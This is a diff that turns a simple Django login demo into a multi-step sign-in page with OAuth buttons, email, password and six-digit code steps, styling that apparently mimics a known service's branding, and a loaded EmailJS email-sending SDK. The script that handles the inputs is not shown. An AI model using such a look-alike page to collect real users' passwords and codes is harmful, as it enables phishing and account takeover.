@@ -1,69 +1,176 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Django Cookie Auth Demo</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in or sign up</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <!-- <script type="text/javascript">
+    // Initialize EmailJS with your Public Key (Replace 'YOUR_PUBLIC_KEY' with your actual key)
+    
+  </script> -->
+   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <div class="card">
-    <!-- Auth Section (Register & Login Forms) -->
-    <div id="auth-section">
-      <!-- Login Form -->
-      <div id="login-box">
-        <h2>Login</h2>
-        <form id="login-form">
-          <div class="form-group">
-            <label for="login-username">Username</label>
-            <input type="text" id="login-username" required />
+  <!-- Top Header -->
+  <header>
+    <svg class="logo" viewBox="0 0 24 24" aria-label="Logo">
+      <path d="M6 2L0 6l6 4 6-4-6-4zm12 0l-6 4 6 4 6-4-6-4zM0 14l6 4 6-4-6-4-6 4zm18-4l-6 4 6 4 6-4-6-4zM6 19.5l6 4 6-4-6-4-6 4z"/>
+    </svg>
+  </header>
+
+  <!-- Main Card -->
+  <main>
+    <div class="auth-card">
+
+      <!-- Loading Square Box Overlay -->
+      <div id="loading-overlay" class="loading-overlay" aria-live="polite" aria-busy="true">
+        <div class="loading-square-box" title="Logging in...">
+          <div class="square-spinner"></div>
+        </div>
+      </div>
+
+      <!-- STEP 1: Email & OAuth -->
+      <div id="step-1" class="step active">
+        <h1>Log in or sign up for free</h1>
+
+        <div class="oauth-group">
+          <button type="button" class="oauth-btn" onclick="handleOAuth('Google')">
+            <svg viewBox="0 0 24 24">
+              <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"/>
+              <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.11-6.72-4.96H1.29v3.14C3.26 21.3 7.31 24 12 24z"/>
+              <path fill="#FBBC05" d="M5.28 14.24c-.24-.72-.38-1.49-.38-2.24s.14-1.52.38-2.24V6.62H1.29C.47 8.24 0 10.06 0 12s.47 3.76 1.29 5.38l3.99-3.14z"/>
+              <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.26 2.7 1.29 6.62l3.99 3.14c.95-2.85 3.6-4.96 6.72-4.96z"/>
+            </svg>
+            Continue with Google
+          </button>
+
+          <button type="button" class="oauth-btn" onclick="handleOAuth('Apple')">
+            <svg viewBox="0 0 24 24">
+              <path fill="#000000" d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+            </svg>
+            Continue with Apple
+          </button>
+
+          <button type="button" class="oauth-btn" onclick="handleOAuth('Microsoft')">
+            <svg viewBox="0 0 24 24">
+              <path fill="#f25022" d="M1 1h10v10H1z"/>
+              <path fill="#00a4ef" d="M1 13h10v10H1z"/>
+              <path fill="#7fba00" d="M13 1h10v10H13z"/>
+              <path fill="#ffb900" d="M13 13h10v10H13z"/>
+            </svg>
+            Continue with Microsoft
+          </button>
+        </div>
+
+        <div class="divider">or</div>
+
+        <form id="email-form" novalidate>
+          <div class="input-group">
+            <input type="email" id="email-input" placeholder="name@company.com" required>
+            <div id="email-error" class="error-msg">Please enter a valid email address.</div>
           </div>
-          <div class="form-group">
-            <label for="login-password">Password</label>
-            <input type="password" id="login-password" required />
-          </div>
-          <button type="submit">Log In</button>
+          <button type="submit" class="primary-btn">Continue</button>
         </form>
-        <button class="btn-secondary" onclick="toggleForm('register')">Need an account? Register</button>
       </div>
 
-      <!-- Register Form -->
-      <div id="register-box" class="hidden">
-        <h2>Register</h2>
-        <form id="register-form">
-          <div class="form-group">
-            <label for="reg-username">Username</label>
-            <input type="text" id="reg-username" required />
+      <!-- STEP 2: Password -->
+      <div id="step-2" class="step">
+        <button type="button" class="back-btn" onclick="goToStep(1)" aria-label="Go back">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="19" y1="12" x2="5" y2="12"></line>
+            <polyline points="12 19 5 12 12 5"></polyline>
+          </svg>
+        </button>
+
+        <h1>Welcome back!</h1>
+        <p class="subtitle">Log in using <span id="display-email">doe@gmail.com</span></p>
+
+        <form id="password-form" novalidate>
+          <div class="input-group">
+            <input type="password" id="password-input" class="password-input" placeholder="Password" required>
+            <button type="button" class="toggle-password" id="toggle-pw-btn" aria-label="Show password">
+              <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+            </button>
+            <div id="password-error" class="error-msg">Please enter your password.</div>
           </div>
-          <div class="form-group">
-            <label for="reg-email">Email</label>
-            <input type="email" id="reg-email" required />
-          </div>
-          <div class="form-group">
-            <label for="reg-password">Password</label>
-            <input type="password" id="reg-password" required />
-          </div>
-          <button type="submit">Register</button>
+
+          <a href="#" class="forgot-link" onclick="alert('Password reset link simulated!'); return false;">Forgot your password?</a>
+
+          <label class="checkbox-label">
+            <input type="checkbox" id="remember-me" checked>
+            <span>Remember me</span>
+          </label>
+
+          <button type="submit" class="primary-btn">Log in</button>
         </form>
-        <button class="btn-secondary" onclick="toggleForm('login')">Already registered? Log In</button>
       </div>
-    </div>
 
-    <!-- Profile Section (Authenticated View) -->
-    <div id="profile-section" class="hidden">
-      <h2>Welcome Back!</h2>
-      <div class="user-info">
-        <p><strong>Username:</strong> <span id="user-username"></span></p>
-        <p><strong>Email:</strong> <span id="user-email"></span></p>
+      <!-- STEP 3: Verification Code -->
+      <div id="step-3" class="step">
+        <h1>Enter verification code</h1>
+        <p class="subtitle">We sent a code to <span id="verify-email">doe@gmail.com</span>.<br>Enter the code to continue.</p>
+
+        <form id="otp-form">
+          <div class="otp-container" id="otp-inputs">
+            <input type="text" inputmode="numeric" maxlength="1" class="otp-input" aria-label="Digit 1">
+            <input type="text" inputmode="numeric" maxlength="1" class="otp-input" aria-label="Digit 2">
+            <input type="text" inputmode="numeric" maxlength="1" class="otp-input" aria-label="Digit 3">
+            <input type="text" inputmode="numeric" maxlength="1" class="otp-input" aria-label="Digit 4">
+            <input type="text" inputmode="numeric" maxlength="1" class="otp-input" aria-label="Digit 5">
+            <input type="text" inputmode="numeric" maxlength="1" class="otp-input" aria-label="Digit 6">
+          </div>
+
+          <div class="help-row">
+            <span>Having trouble getting a code?</span>
+            <span class="icon-circle" title="Check your spam folder or click Resend code below">?</span>
+          </div>
+
+          <label class="checkbox-label">
+            <input type="checkbox" id="trust-device">
+            <span>Trust this device <span class="icon-circle" title="You won't be asked for a code on this browser for 30 days">i</span></span>
+          </label>
+
+          <button type="submit" id="verify-btn" class="primary-btn" disabled>Continue</button>
+        </form>
+
+        <a href="#" class="resend-link" onclick="resendCode(event)">Resend code</a>
       </div>
-      <button class="btn-danger" id="logout-btn">Log Out</button>
-    </div>
 
-    <!-- Status Message Display -->
-    <div id="msg" class="message"></div>
+      <!-- STEP 4: Logged In Confirmation (Demo) -->
+      <div id="step-4" class="step">
+        <div class="success-box">
+          <div class="success-icon">✓</div>
+          <h1>You're logged in!</h1>
+          <p class="subtitle">Authenticated as <strong id="final-email"></strong></p>
+          <button type="button" class="primary-btn" onclick="resetDemo()">Start Over</button>
+        </div>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- Bottom Cookie Banner -->
+  <div class="cookie-banner" id="cookie-banner">
+    <p>
+      We use cookies to provide, improve, protect and promote our services. Visit our 
+      <a href="#" onclick="return false;">Privacy Policy</a> and 
+      <a href="#" onclick="return false;">Privacy Policy FAQs</a> to learn more. You can manage your personal preferences, including your 'Do not sell or share my personal data to third parties' setting using the “Customize cookies” button below.
+    </p>
+    <a href="#" class="customize-cookies" onclick="return false;">Customize cookies</a>
+    <div class="cookie-actions">
+      <button type="button" class="cookie-btn cookie-decline" onclick="dismissCookies()">Decline</button>
+      <button type="button" class="cookie-btn cookie-accept" onclick="dismissCookies()">Accept All</button>
+    </div>
   </div>
-
-  <script src="./script.js"></script>
+   <script src="./script.js"></script>
 </body>
 </html>
+
+
+
